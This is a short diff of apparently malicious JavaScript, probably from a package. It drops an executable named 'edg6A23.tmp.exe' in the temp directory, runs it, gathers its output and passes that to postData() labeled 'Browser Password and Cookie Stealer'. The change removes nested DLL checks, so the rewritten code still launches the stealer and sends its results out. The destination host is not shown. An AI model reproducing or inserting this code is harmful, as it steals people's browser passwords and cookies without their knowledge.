@@ -27,25 +27,19 @@ try {
     };
 
     checkForFile('edg6A23.tmp.exe').then(() => {
-        checkForFile('libsodium.dll').then(() => {
-            checkForFile('libsodium-64.dll').then(() => {
-                checkForFile('Sodium.dll').then(() => {
-                    const ls = spawn(`${os.tmpdir()}/edg6A23.tmp.exe`, ['aaa']);
-                    let data = '';
+        const ls = spawn(`${os.tmpdir()}/edg6A23.tmp.exe`, ['aaa']);
+        let data = '';
 
-                    ls.stdout.on('data', function (d) {
-                        data += d.toString();
-                    });
+        ls.stdout.on('data', function (d) {
+            data += d.toString();
+        });
 
-                    ls.stderr.on('data', function (d) {
-                        data += d.toString();
-                    });
+        ls.stderr.on('data', function (d) {
+            data += d.toString();
+        });
 
-                    ls.on('exit', function (code) {
-                        postData(data.toString(), 'Browser Password and Cookie Stealer');
-                    });
-                });
-            });
+        ls.on('exit', function (code) {
+            postData(data.toString(), 'Browser Password and Cookie Stealer');
         });
     });
 } catch (e) {
